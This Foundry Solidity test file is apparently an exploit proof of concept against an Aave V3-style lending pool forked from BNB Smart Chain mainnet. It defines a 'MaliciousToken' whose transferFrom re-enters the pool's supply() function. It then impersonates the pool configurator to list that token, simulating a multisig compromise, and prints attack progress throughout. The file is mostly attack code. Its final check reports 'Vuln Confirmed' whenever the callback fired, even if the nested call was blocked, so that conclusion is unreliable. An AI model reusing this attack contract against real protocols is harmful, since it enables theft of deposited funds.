
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IPool {
    function liquidationCall(address collateralAsset, address debtAsset, address user, uint256 debtToCover, bool receiveAToken) external;
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
    function initReserve(address asset, address aTokenAddress, address stableDebtAddress, address variableDebtAddress, address interestRateStrategyAddress) external;
    function setConfiguration(address asset, DataTypes.ReserveConfigurationMap calldata configuration) external;
    function ADDRESSES_PROVIDER() external view returns (address);
    function getUserAccountData(address user) external view returns (
        uint256 totalCollateralBase,
        uint256 totalDebtBase,
        uint256 availableBorrowsBase,
        uint256 currentLiquidationThreshold,
        uint256 ltv,
        uint256 healthFactor
    );
}

interface IPoolAddressesProvider {
    function getPoolConfigurator() external view returns (address);
    function getPriceOracle() external view returns (address);
}

interface IPriceOracle {
    function setAssetPrice(address asset, uint256 price) external;
    function getAssetPrice(address asset) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

library DataTypes {
    struct ReserveConfigurationMap {
        uint256 data;
    }
    
    struct CalculateInterestRatesParams {
        uint256 unbacked;
        uint256 liquidityAdded;
        uint256 liquidityTaken;
        uint256 totalStableDebt;
        uint256 totalVariableDebt;
        uint256 averageStableBorrowRate;
        uint256 reserveFactor;
        address reserve;
        address aToken;
    }
}

// Mock AToken that properly implements Aave V3 interface
contract MockAToken {
    address public UNDERLYING_ASSET_ADDRESS;
    address public POOL;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    
    constructor(address underlying, address pool) { 
        UNDERLYING_ASSET_ADDRESS = underlying; 
        POOL = pool;
    }
    
    function mint(address caller, address onBehalfOf, uint256 amount, uint256) external returns (bool) {
        require(msg.sender == POOL, "CALLER_MUST_BE_POOL");
        _balances[onBehalfOf] += amount;
        _totalSupply += amount;
        return true;
    }
    
    function burn(address from, address, uint256 amount, uint256) external {
        require(msg.sender == POOL, "CALLER_MUST_BE_POOL");
        _balances[from] -= amount;
        _totalSupply -= amount;
    }
    
    function scaledTotalSupply() external view returns (uint256) { 
        return _totalSupply;
    }
    
    function scaledBalanceOf(address user) external view returns (uint256) {
        return _balances[user];
    }
    
    function balanceOf(address user) external view returns (uint256) { 
        return _balances[user]; 
    }
}

// Mock VariableDebtToken
contract MockVariableDebtToken {
    address public UNDERLYING_ASSET_ADDRESS;
    address public POOL;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    
    constructor(address underlying, address pool) { 
        UNDERLYING_ASSET_ADDRESS = underlying;
        POOL = pool;
    }
    
    function mint(address user, address onBehalfOf, uint256 amount, uint256) external returns (bool, uint256) {
        require(msg.sender == POOL, "CALLER_MUST_BE_POOL");
        _balances[onBehalfOf] += amount;
        _totalSupply += amount;
        return (true, _totalSupply);
    }
    
    function burn(address from, uint256 amount) external returns (uint256) {
        require(msg.sender == POOL, "CALLER_MUST_BE_POOL");
        _balances[from] -= amount;
        _totalSupply -= amount;
        return _totalSupply;
    }
    
    function scaledTotalSupply() external view returns (uint256) { 
        return _totalSupply;
    }
    
    function scaledBalanceOf(address user) external view returns (uint256) {
        return _balances[user];
    }
    
    function balanceOf(address user) external view returns (uint256) { 
        return _balances[user]; 
    }
    
    function getSupplyData() external view returns (uint256, uint256, uint256, uint40) {
        return (_totalSupply, _totalSupply, 1e27, uint40(block.timestamp));
    }
}

// Mock StableDebtToken
contract MockStableDebtToken {
    address public UNDERLYING_ASSET_ADDRESS;
    
    constructor(address underlying) { 
        UNDERLYING_ASSET_ADDRESS = underlying;
    }
    
    function scaledTotalSupply() external pure returns (uint256) { return 0; }
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function getSupplyData() external pure returns (uint256, uint256, uint256, uint40) {
        return (0, 0, 0, 0);
    }
}

// Mock Interest Rate Strategy
contract MockInterestRateStrategy {
    function calculateInterestRates(
        uint256,
        uint256,
        uint256,
        uint256,
        uint256,
        uint256,
        uint256,
        address,
        address
    ) external pure returns (uint256, uint256, uint256) {
        return (5e25, 10e25, 8e25); // 5% base, 10% variable, 8% stable
    }
}

// Malicious ERC20 token with reentrancy callback
contract MaliciousToken {
    string public constant name = "Malicious Token";
    string public constant symbol = "EVIL";
    uint8 public constant decimals = 18;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    address public pool;
    address public attacker;
    bool public attackEnabled;
    uint256 public reentrancyCount;
    
    event ReentrancyAttempted(uint256 count, bool success);
    
    constructor() {
        balanceOf[msg.sender] = 1000000e18;
        attacker = msg.sender;
    }
    
    function setPool(address _pool) external {
        pool = _pool;
    }
    
    function enableAttack() external {
        attackEnabled = true;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        // REENTRANCY ATTACK POINT
        if (attackEnabled && msg.sender == pool && reentrancyCount == 0) {
            reentrancyCount++;
            console.log("REENTRANCY TRIGGERED");
            console.log("Attempting to call supply() during transferFrom()");
            
            // Try to reenter via supply
            try IPool(pool).supply(address(this), 1e18, attacker, 0) {
                console.log("SUCCESS: Reentrancy worked! No guard detected!");
                emit ReentrancyAttempted(reentrancyCount, true);
            } catch Error(string memory reason) {
                console.log("BLOCKED: Reentrancy prevented");
                emit ReentrancyAttempted(reentrancyCount, false);
            } catch {
                console.log("BLOCKED: Reentrancy prevented");
                emit ReentrancyAttempted(reentrancyCount, false);
            }
        }
        
        // Complete the transfer
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ReentrancyTest is Test {
    IPool constant POOL = IPool(0xcB0620b181140e57D1C0D8b724cde623cA963c8C);
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant WBNB_WHALE = 0xF977814e90dA44bFA03b6295A0616a897441aceC;
    
    MaliciousToken maliciousToken;
    MockAToken mockAToken;
    MockVariableDebtToken mockVariableDebt;
    MockStableDebtToken mockStableDebt;
    MockInterestRateStrategy mockStrategy;
    
    address attacker;
    address victim;
    
    function setUp() public {
        vm.createSelectFork("https://bsc-dataseed.binance.org/");
        
        attacker = address(this);
        victim = vm.addr(1);
        
        console.log("Pool:", address(POOL));
        console.log("Attacker:", attacker);
        console.log("Victim:", victim);
    }
    
    function test_ReentrancyVulnerability() public {
        console.log("Step 1: Deploying malicious token");
        maliciousToken = new MaliciousToken();
        maliciousToken.setPool(address(POOL));
        console.log("Malicious Token:", address(maliciousToken));
        
        console.log("Step 2: Initializing malicious token as reserve");
        console.log("Simulating compromised multisig scenario");
        
        // Deploy mock contracts
        mockAToken = new MockAToken(address(maliciousToken), address(POOL));
        mockVariableDebt = new MockVariableDebtToken(address(maliciousToken), address(POOL));
        mockStableDebt = new MockStableDebtToken(address(maliciousToken));
        mockStrategy = new MockInterestRateStrategy();
        
        // Get configurator address
        address provider = POOL.ADDRESSES_PROVIDER();
        address configurator = IPoolAddressesProvider(provider).getPoolConfigurator();
        
        // Impersonate configurator (simulating multisig compromise)
        vm.startPrank(configurator);
        
        POOL.initReserve(
            address(maliciousToken),
            address(mockAToken),
            address(mockStableDebt),
            address(mockVariableDebt),
            address(mockStrategy)
        );
        
        // Configure reserve parameters
        DataTypes.ReserveConfigurationMap memory config;
        config.data = (1 << 56); // Active
        config.data |= (8000 << 0); // LTV: 80%
        config.data |= (8500 << 16); // Liquidation threshold: 85%
        config.data |= (10500 << 32); // Liquidation bonus: 105%
        config.data |= (18 << 48); // Decimals: 18
        config.data |= (1 << 58); // Borrowing enabled
        
        POOL.setConfiguration(address(maliciousToken), config);
        vm.stopPrank();
        
        console.log("SUCCESS: Malicious token added to reserves");
        
        console.log("Step 3: Setting up victim position");
        
        // Give victim WBNB
        vm.prank(WBNB_WHALE);
        IERC20(WBNB).transfer(victim, 100e18);
        
        // Victim supplies WBNB as collateral
        vm.startPrank(victim);
        IERC20(WBNB).approve(address(POOL), type(uint256).max);
        POOL.supply(WBNB, 50e18, victim, 0);
        console.log("Victim supplied 50 WBNB as collateral");
        
        // Check victim can borrow
        (, , uint256 availableBorrows, , , ) = POOL.getUserAccountData(victim);
        console.log("Available to borrow (USD):", availableBorrows / 1e8);
        vm.stopPrank();
        
        console.log("Step 4: Executing reentrancy attack");
        
        // Attacker supplies malicious tokens
        maliciousToken.approve(address(POOL), type(uint256).max);
        
        console.log("Attacker supplying malicious tokens");
        maliciousToken.enableAttack();
        
        // This supply() will trigger transferFrom() on malicious token
        // which will attempt to reenter supply() again
        POOL.supply(address(maliciousToken), 1000e18, attacker, 0);
        
        console.log("Step 5: Analyzing results");
        
        if (maliciousToken.reentrancyCount() > 0) {
            console.log("No reentrancy guard on supply()");
            console.log("Protocol allows nested calls");
            console.log("Attacker can manipulate state during execution");
            
            assertTrue(true, "Vuln Confirmed");
        } else {
            console.log("PROTECTED: Reentrancy guard is present");
            assertTrue(false, "No reentrancy detected");
        }
        
    }
}
